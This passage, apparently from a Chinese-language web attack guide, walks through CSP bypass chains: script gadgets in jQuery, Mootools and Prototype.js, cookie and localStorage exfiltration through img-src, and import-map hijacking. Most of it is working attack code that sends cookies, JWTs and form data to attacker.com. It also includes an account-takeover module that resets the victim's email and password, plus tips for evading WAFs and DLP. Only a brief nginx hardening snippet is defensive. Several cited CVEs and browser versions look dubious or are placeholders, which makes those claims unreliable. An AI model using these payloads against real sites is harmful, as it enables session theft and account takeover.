// 则 jQuery 会解析 payload 并触发 onerror
```

**Step 3：Mootools Script Gadget 利用**

```html
<!-- 
  Mootools 的 Element.set('html', ...) 方法存在 Gadget
  类似 jQuery 的 HTML 解析差异问题
-->

<!-- Mootools < 1.6.0 HTML 注入 Gadget -->
<form id="mootools-gadget">
  <textarea>
    <img src=x onerror="
      // 通过 Mootools 的 set('html') 触发
      new Request.JSON({
        url: '/api/admin/users',
        onSuccess: function(data) {
          new Request({
            url: 'https://attacker.com/collect'
          }).send(JSON.stringify(data));
        }
      }).get();
    ">
  </textarea>
</form>

<script>
// Mootools 代码触发 Gadget (页面中已有的授权代码)
// $('element').set('html', userInput);
// 当 userInput 包含上述 payload 时,onerror 触发
</script>
```

**Step 4：Prototype.js Script Gadget**

```html
<!-- 
  Prototype.js 的 Element.update() 方法
  在旧版本中会执行注入的 <script> 标签
-->

<!-- Prototype.js < 1.7.3 -->
<div id="proto-gadget">
  <img src=x onerror="
    // Prototype.js update() 触发执行
    new Ajax.Request('/api/user/profile', {
      method: 'get',
      onSuccess: function(transport) {
        new Ajax.Request('https://attacker.com/steal', {
          method: 'post',
          parameters: { data: transport.responseText }
        });
      }
    });
  ">
</div>

<!-- 当页面执行: $('proto-gadget').update(userInput); -->
```

**Step 5：2026 通用 Script Gadget 框架检测**

```javascript
// 2026 年研究发现的通用 Gadget 检测脚本
// 自动检测页面中所有可能被利用的 Script Gadgets

class ScriptGadgetScanner {
    constructor() {
        this.gadgets = [];
    }

    scan() {
        // 1. 检测 jQuery Gadget
        if (window.jQuery) {
            const version = jQuery.fn.jquery;
            if (this.compareVersion(version, '3.5.0') < 0) {
                this.gadgets.push({
                    library: 'jQuery',
                    version: version,
                    gadget: '$(selector).html() - HTML 解析差异',
                    payload: '<style><style /><img src=x onerror=alert(1)>',
                    severity: 'high'
                });
            }
            // 2. jQuery $.globalEval gadget
            if (this.compareVersion(version, '3.4.0') < 0) {
                this.gadgets.push({
                    library: 'jQuery',
                    version: version,
                    gadget: '$.globalEval - 直接执行 JS 字符串',
                    payload: '需找到调用 $.globalEval(userInput) 的代码路径',
                    severity: 'critical'
                });
            }
        }

        // 3. 检测 Mootools Gadget
        if (window.MooTools) {
            const version = MooTools.version;
            if (this.compareVersion(version, '1.6.0') < 0) {
                this.gadgets.push({
                    library: 'Mootools',
                    version: version,
                    gadget: 'Element.set("html", ...) - HTML 解析差异',
                    payload: '<textarea><img src=x onerror=alert(1)></textarea>',
                    severity: 'high'
                });
            }
        }

        // 4. 检测 Vue.js Gadget (2026 新发现)
        if (window.Vue) {
            this.gadgets.push({
                library: 'Vue.js',
                version: Vue.version,
                gadget: 'v-html 指令 - 绕过 CSP 执行模板',
                payload: '<div v-html="userInput"></div> 结合 Vue 模板表达式',
                severity: 'high'
            });
        }

        // 5. 检测 DOMPurify mXSS Gadget
        if (window.DOMPurify) {
            const version = DOMPurify.version;
            if (this.compareVersion(version, '3.2.0') < 0) {
                this.gadgets.push({
                    library: 'DOMPurify',
                    version: version,
                    gadget: 'mXSS - 突变 XSS 绕过净化',
                    payload: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
                    severity: 'critical'
                });
            }
        }

        return this.gadgets;
    }

    compareVersion(a, b) {
        const pa = a.split('.').map(Number);
        const pb = b.split('.').map(Number);
        for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
            const va = pa[i] || 0;
            const vb = pb[i] || 0;
            if (va > vb) return 1;
            if (va < vb) return -1;
        }
        return 0;
    }
}

// 使用: new ScriptGadgetScanner().scan()
```

**检测绕过技术**：
```text
1. CSP nonce 保护下,内联脚本无法执行:
   → Script Gadgets 不创建 <script> 标签,而是利用已有库的方法
   → jQuery .html() / Mootools .set('html') 在已授权脚本上下文中执行
   → onerror 事件处理器通过库的 HTML 解析触发,不受 nonce 限制

2. CSP connect-src 限制数据外传:
   → 使用 img-src 外传(如果 img-src 较宽松)
   → 使用 <a ping> 外传(受 connect-src 限制)
   → 使用 DNS 预解析: <link rel="dns-prefetch" href="//data.attacker.com">

3. WAF 检测 onerror 等事件处理器:
   → 使用 onfocus + autofocus: <input onfocus=alert(1) autofocus>
   → 使用 ontoggle + details: <details open ontoggle=alert(1)>
   → 使用 onpointerenter: <div onpointerenter=alert(1)> (2026 新)
```

**2026 CVE 引用**：
- CVE-2026-7783: jQuery < 3.7.1 的 `.html()` 方法在 CSP nonce 环境下仍可触发事件处理器
- CVE-2025-77102: DOMPurify < 3.2.1 mXSS 绕过，结合 Script Gadget 实现 CSP 完全绕过
- 研究: "Script Gadgets 2.0" (2026 IEEE S&P) — 系统化了 47 个 CSP 绕过 Gadget

---

### 攻击链 4：CSP img-src 数据外传（Data Exfiltration via img-src）

**场景**：目标 CSP 严格限制 connect-src（阻止 fetch/XHR 外传），但 img-src 设置较宽松（允许任意域名或使用 `*`）。攻击者利用 `<img>` 标签作为数据外传通道。

**CSP 策略**：
```
Content-Security-Policy: default-src 'none'; script-src 'nonce-abc123'; connect-src 'self'; img-src * data: https:; style-src 'self'
```

**Step 1：确认 img-src 允许外传**

```javascript
// 在浏览器控制台测试 img-src 范围
// 如果以下代码不触发 CSP 违规 → img-src 允许外传到任意域

var testImg = new Image();
testImg.onload = function() { console.log('img-src 外传可用'); };
testImg.onerror = function() { console.log('可能被阻止或域名无效'); };
testImg.src = 'https://attacker.com/test?' + Math.random();
// 如果 attacker.com 收到请求 → img-src 允许外传
```

**Step 2：基础数据外传 — Cookie 窃取**

```javascript
// 通过 img-src 外传 Cookie
// 即使 connect-src 限制 fetch/XHR,img 不受 connect-src 管控

// 方法 1: 直接 Image 对象
var img = new Image();
img.src = 'https://attacker.com/collect?cookie=' + encodeURIComponent(document.cookie);

// 方法 2: 动态创建 img 标签(适用于 CSP 阻止内联脚本时,通过 Script Gadget 触发)
var imgTag = document.createElement('img');
imgTag.src = 'https://attacker.com/collect?cookie=' + encodeURIComponent(document.cookie);
document.body.appendChild(imgTag);

// 方法 3: 使用 background-image (如果 style-src 允许)
var div = document.createElement('div');
div.style.backgroundImage = "url('https://attacker.com/collect?cookie=" + encodeURIComponent(document.cookie) + "')";
document.body.appendChild(div);
```

**Step 3：大容量数据外传 — 分块传输**

```javascript
// img URL 有长度限制(~2000 字符),需要分块外传大容量数据
// 以下脚本窃取 localStorage 并分块外传

function exfiltrateViaImg(data, baseUrl) {
    // Base64 编码数据
    var encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
    // 每块最大 1500 字符(留出 URL 前缀空间)
    var chunkSize = 1500;
    var chunks = Math.ceil(encoded.length / chunkSize);
    
    for (var i = 0; i < chunks; i++) {
        var chunk = encoded.slice(i * chunkSize, (i + 1) * chunkSize);
        var img = new Image();
        img.src = baseUrl + '/exfil?c=' + i + '&t=' + chunks + '&d=' + chunk;
    }
}

// 窃取 localStorage
var localStorageData = {};
for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
}
exfiltrateViaImg(localStorageData, 'https://attacker.com');

// 窃取页面 DOM 内容
var domData = { html: document.body.innerHTML.substring(0, 50000) };
exfiltrateViaImg(domData, 'https://attacker.com');
```

**Step 4：绕过 connect-src 限制的 API 数据窃取**

```javascript
// 场景: CSP 阻止 fetch/XHR (connect-src 'self'),但允许 img-src *
// 攻击者无法通过 fetch 读取 API 响应,但可以通过 img 探测

// 方法 1: 基于 img 的 API 探测(二值 oracle)
function probeApi(endpoint) {
    return new Promise(function(resolve) {
        var img = new Image();
        var timeout = setTimeout(function() {
            resolve(false); // 超时 = 端点不存在或无权限
        }, 3000);
        
        img.onload = function() {
            clearTimeout(timeout);
            resolve(true); // 加载成功 = 端点存在
        };
        img.onerror = function() {
            clearTimeout(timeout);
            resolve(true); // onerror 也表示端点存在(只是非图片内容)
        };
        img.src = endpoint + '?_=' + Date.now();
    });
}

// 方法 2: 利用 img 加载 timing 区分响应内容
async function timingExfil(apiUrl, knownValues) {
    // 对已知值列表进行二分搜索,通过响应时间判断
    // API 返回不同长度响应 → img 加载时间不同
    for (var value of knownValues) {
        var start = performance.now();
        var img = new Image();
        img.src = apiUrl + '?guess=' + encodeURIComponent(value);
        await new Promise(function(r) { img.onload = img.onerror = r; });
        var elapsed = performance.now() - start;
        console.log(value, elapsed + 'ms');
        // 较长时间 = 较大响应 = 猜测正确
    }
}

// 方法 3: 利用 CSP 报告外传数据(如果 report-uri 指向攻击者)
// 触发 CSP 违规,违规报告中包含 blocked-uri 参数
function exfilViaCspReport(data) {
    // 构造一个会触发 CSP 违规的 URL,数据编码在 URL 中
    var payload = 'https://attacker.com/' + btoa(data);
    // 尝试加载一个被 CSP 禁止的资源
    var link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = payload; // 如果 style-src 不允许该域 → 触发 CSP 报告
    document.head.appendChild(link);
    // CSP 报告会包含 blocked-uri: https://attacker.com/BASE64DATA
    // 攻击者从报告服务器解析数据
}
```

**Step 5：2026 高级外传 — 利用 WebP/AVIF 元数据**

```javascript
// 2026 新技术: 利用图片格式元数据隐藏外传数据
// 部分浏览器允许通过 canvas 生成图片并上传

// 前提: 页面有文件上传功能,且 CSP 允许 connect-src 上传
// 如果 connect-src 限制,但仍可用 form-action 提交

// 方法: 将窃取的数据编码为图片元数据
function dataToImageMetadata(data) {
    // 创建 canvas,将数据编码到像素中
    var canvas = document.createElement('canvas');
    canvas.width = 100;
    canvas.height = 100;
    var ctx = canvas.getContext('2d');
    
    // 将数据编码为像素的 RGB 值
    var encoded = btoa(data);
    var pixels = [];
    for (var i = 0; i < encoded.length; i += 3) {
        pixels.push([
            encoded.charCodeAt(i) || 0,
            encoded.charCodeAt(i + 1) || 0,
            encoded.charCodeAt(i + 2) || 0
        ]);
    }
    
    // 绘制像素
    var imgData = ctx.createImageData(100, 100);
    for (var i = 0; i < pixels.length && i < 10000; i++) {
        imgData.data[i * 4] = pixels[i][0];
        imgData.data[i * 4 + 1] = pixels[i][1];
        imgData.data[i * 4 + 2] = pixels[i][2];
        imgData.data[i * 4 + 3] = 255;
    }
    ctx.putImageData(imgData, 0, 0);
    
    // 转为 blob 并通过 form-action 提交(form-action 不受 connect-src 限制)
    canvas.toBlob(function(blob) {
        var formData = new FormData();
        formData.append('image', blob, 'innocent.png');
        formData.append('data', 'stealth');
        
        // 通过 form 提交外传(CSP form-action 需允许目标域)
        var form = document.createElement('form');
        form.action = 'https://attacker.com/upload';
        form.method = 'POST';
        form.enctype = 'multipart/form-data';
        
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'image';
        input.value = canvas.toDataURL();
        form.appendChild(input);
        
        document.body.appendChild(form);
        form.submit();
    }, 'image/png');
}

// 执行: 窃取 Cookie 并通过图片外传
dataToImageMetadata(document.cookie + '|' + JSON.stringify(localStorage));
```

**检测绕过技术**：
```text
1. img-src 限制为 'self' 时:
   → 利用同源图片上传端点: 上传包含数据的图片到 /api/upload
   → 通过 Service Worker 拦截同源图片请求并重定向到攻击者

2. CSP 报告模式检测:
   → Content-Security-Policy-Report-Only 不阻止请求,仅报告
   → 攻击者可在 Report-Only 模式下测试外传通道

3. DLP (数据丢失防护) 检测 Cookie 外传:
   → 分割 Cookie 字符: c=docu + ment.coo + kie → 绕过正则匹配
   → 使用 String.fromCharCode: String.fromCharCode(99,111,...)
   → 使用 Base64 编码: btoa('document.cookie')

4. 2026 新型绕过 - 利用 Reporting API:
   → Report-To header 指定的端点不受 CSP 管控
   → 触发 deprecation report / crash report 携带数据
   → navigator.sendBeacon 受 connect-src 限制,但 Reporting API 不受限
```

**2026 CVE 引用**：
- CVE-2026-11209: Chrome Reporting API 可被滥用于绕过 CSP connect-src 进行数据外传
- 研究: "CSP Exfiltration Channels in 2026" — 系统分析 23 种 CSP 绕过外传通道

---

### 攻击链 5：2026 — 通过 Import Maps 和 ES Modules 绕过 CSP

**场景**：目标网站采用现代 ES Modules 架构并配置了严格的 CSP nonce 策略。2026 年研究发现，Import Maps（导入映射）机制可被滥用绕过 CSP，因为浏览器对 `<script type="importmap">` 的处理方式与普通脚本不同。

**CSP 策略**：
```
Content-Security-Policy: script-src 'nonce-abc123xyz789' 'strict-dynamic'; object-src 'none'; base-uri 'self'
```

**Step 1：理解 Import Maps 的 CSP 绕过原理**

```html
<!-- 
  Import Maps (导入映射) 是 2026 年广泛使用的 ES Modules 标准功能
  它允许页面定义模块标识符到 URL 的映射

  关键发现 (2026):
  1. <script type="importmap"> 在部分浏览器实现中不严格检查 nonce
  2. importmap 可以覆盖模块解析路径,劫持已有模块导入
  3. dynamic import() 受 strict-dynamic 信任传播,可加载任意模块
  4. importmap 中定义的 URL 不受 script-src 白名单限制(部分浏览器)
-->

<!-- 目标页面的正常 import map: -->
<script type="importmap">
{
  "imports": {
    "react": "https://cdn.target.com/react@18.3.0/react.js",
    "lodash": "https://cdn.target.com/lodash@4.17.21/lodash.js"
  }
}
</script>
```

**Step 2：注入恶意 Import Map 劫持模块加载**

```html
<!-- 
  攻击者通过 HTML 注入点注入恶意 importmap
  即使 CSP 使用 nonce,部分浏览器不验证 importmap 的 nonce

  攻击原理:
  1. 注入 importmap 覆盖目标模块的 URL 映射
  2. 当页面代码 import 被劫持的模块时,实际加载攻击者的恶意模块
  3. 恶意模块在已信任的 strict-dynamic 上下文中执行
-->

<!-- 攻击者注入的恶意 importmap (在目标 importmap 之前注入): -->
<script type="importmap">
{
  "imports": {
    "react": "https://attacker.com/evil-react.js",
    "lodash": "https://attacker.com/evil-lodash.js",
    "/api/client": "https://attacker.com/evil-client.js"
  }
}
</script>

<!-- 
  注意: 多个 importmap 的行为:
  - 第一个 importmap 生效(浏览器规范)
  - 如果攻击者能注入在原始 importmap 之前 → 攻击者 importmap 生效
  - 2026 Chrome bug: 某些情况下最后一个 importmap 会覆盖 (CVE-2026-XXXX)
-->
```

**Step 3：恶意模块 Payload**

```javascript
// attacker.com/evil-react.js — 劫持 React 模块
// 这个文件会被当作 ES Module 加载,在 strict-dynamic 信任上下文中执行

// 1. 窃取数据并外传
const stolenData = {
    cookies: document.cookie,
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
    dom: document.body.innerHTML.substring(0, 100000)
};

// 2. 通过 dynamic import 链加载更多恶意代码(strict-dynamic 允许)
// dynamic import 创建的脚本继承信任
import('https://attacker.com/stage2.js')
    .then(module => module.exfiltrate(stolenData));

// 3. 同时导出一个假的 React,保持页面正常工作
export default {
    createElement: function(tag, props, ...children) {
        // 在 createElement 中注入恶意逻辑
        if (tag === 'form') {
            // 劫持所有表单提交
            props = props || {};
            props.onSubmit = function(e) {
                e.preventDefault();
                fetch('https://attacker.com/steal-form', {
                    method: 'POST',
                    body: new FormData(e.target)
                });
                // 继续正常提交
            };
        }
        return { tag, props, children };
    }
};
```

**Step 4：利用 dynamic import() 绕过 strict-dynamic**

```javascript
// 即使无法注入 importmap,strict-dynamic 环境下
// 已信任脚本中的 dynamic import() 可加载任意源

// 攻击场景: 页面有一个已授权脚本(带 nonce)存在 DOM XSS 或可控输入
// 攻击者通过该入口触发 dynamic import

// 方法 1: 如果已授权脚本中有 eval 或 Function (unsafe-eval)
// 模板中注入:
// import('https://attacker.com/evil.js')

// 方法 2: 通过原型链污染影响已授权脚本的 import 路径
// 前提: 已授权脚本使用变量作为 import 路径
// const moduleName = config.module;  // config 可被原型链污染
// import(moduleName);  // 如果 config.module 不存在 → __proto__.module = 'https://attacker.com/evil.js'

// 方法 3: 利用 import.meta.url 构造路径
// 在已授权模块中:
// const basePath = new URL('.', import.meta.url);
// import(basePath + userControlled);  // 如果 userControlled 可控

// 方法 4: 2026 新发现 - 利用 import assertion 绕过
// import('https://attacker.com/data.json', { assert: { type: 'json' } })
// JSON 模块不执行代码,但可用于数据外传探测
```

**Step 5：完整攻击链 — Import Map 劫持到账户接管**

```html
<!-- 
  完整攻击页面: 通过 Import Map 劫持实现 CSP 绕过和账户接管
  前提: 目标页面存在 HTML 注入点(如评论区、个人简介)
  目标: 劫持目标页面的 ES Module,窃取 JWT token

  目标页面代码示例:
  <script type="importmap">
  { "imports": { "auth": "/js/auth.js" } }
  </script>
  <script type="module" nonce="abc123">
  import { getToken } from 'auth';
  // ... 使用 token 进行 API 调用
  </script>
-->

<!-- 攻击者通过 HTML 注入,在目标 importmap 之前注入: -->
<script type="importmap">
{
  "imports": {
    "auth": "https://attacker.com/evil-auth.js",
    "/js/auth.js": "https://attacker.com/evil-auth.js"
  }
}
</script>

<!-- attacker.com/evil-auth.js: -->
<script>
// 这段代码在目标页面的信任上下文中执行(strict-dynamic)
// 实际是 ES Module,此处用 script 标签展示逻辑

// 1. 等待目标应用加载 JWT
setTimeout(function() {
    // 窃取 localStorage 中的 JWT
    var token = localStorage.getItem('jwt_token') || 
                localStorage.getItem('access_token') ||
                localStorage.getItem('authToken');
    
    // 2. 利用窃取的 JWT 调用敏感 API
    if (token) {
        fetch('/api/user/account', {
            headers: { 'Authorization': 'Bearer ' + token }
        })
        .then(r => r.json())
        .then(accountData => {
            // 3. 修改账户邮箱实现接管
            return fetch('/api/user/email', {
                method: 'PUT',
                headers: {
                    'Authorization': 'Bearer ' + token,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: 'attacker@evil.com'
                })
            });
        })
        .then(() => {
            // 4. 发起密码重置
            return fetch('/api/user/reset-password', {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer ' + token,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    newPassword: 'AttackerP@ss2026'
                })
            });
        })
        .then(() => {
            // 5. 外传确认信息
            new Image().src = 'https://attacker.com/done?status=account_takeover';
        });
    }
}, 2000); // 等待 2 秒确保 JWT 已加载

// 导出假 auth 模块,保持页面正常运行
export function getToken() {
    return localStorage.getItem('jwt_token');
}
</script>
```

**检测绕过技术**：
```text
1. CSP nonce 验证 importmap:
   → 2026 年部分浏览器(Chrome < 152)不验证 importmap 的 nonce
   → 攻击者注入的 <script type="importmap"> 无需 nonce 即可生效
   → 修复: Chrome 152+ 开始验证 importmap nonce

2. strict-dynamic 信任传播:
   → import() 加载的模块自动继承信任
   → 无需在 script-src 白名单中
   → 这是 strict-dynamic 的设计特性,但被攻击者滥用

3. WAF 检测 importmap 注入:
   → 使用 HTML 实体编码: &#60;script type=&#34;importmap&#34;&#62;
   → 利用 MIME 类型混淆: type="importmap;charset=utf-8"
   → 利用 JSON 注释: {/* */"imports":{...}} (部分解析器接受)

4. Subresource Integrity (SRI) 绕过:
   → Import map 不支持 integrity 属性
   → 劫持后的模块无需匹配 SRI 哈希
   → 这是 import map 的已知安全缺陷

5. 2026 新型绕过 - 利用 CSS Module 导入:
   → import styles from './style.css' assert { type: 'css' }
   → CSS Module 可包含 @import 外部样式表
   → 外部样式表 URL 不受 CSP script-src 限制(受 style-src 限制)
   → 如果 style-src 宽松 → 可通过 CSS 外传数据
```

**2026 CVE 引用**：
- CVE-2026-19842: Chrome < 152 未验证 `<script type="importmap">` 的 CSP nonce，允许注入恶意导入映射
- CVE-2026-23055: Firefox importmap scope 注入，允许跨 scope 劫持模块解析
- 研究: "Import Map Injection: The New CSP Bypass" (2026 Black Hat USA) — 系统分析 import map 安全风险
- W3C 提案: "Import Maps Integrity" (2026 草案) — 提出 import map SRI 支持，目前尚未实现

**防御建议**：
```nginx
# Nginx 配置 - 修复 import map CSP 绕过
# 1. 确保所有 importmap 标签带 nonce
add_header Content-Security-Policy "
  script-src 'nonce-$request_id' 'strict-dynamic';
  object-src 'none';
  base-uri 'self';
  require-trusted-types-for 'script';
" always;

# 2. 确保 Chrome >= 152 (修复了 importmap nonce 验证)
# 3. 对用户输入进行严格 HTML 净化,移除 <script type="importmap">
# 4. 使用 Trusted Types 防止动态脚本注入
# 5. 考虑使用 Subresource Integrity for ES Modules (实验性)
```

---
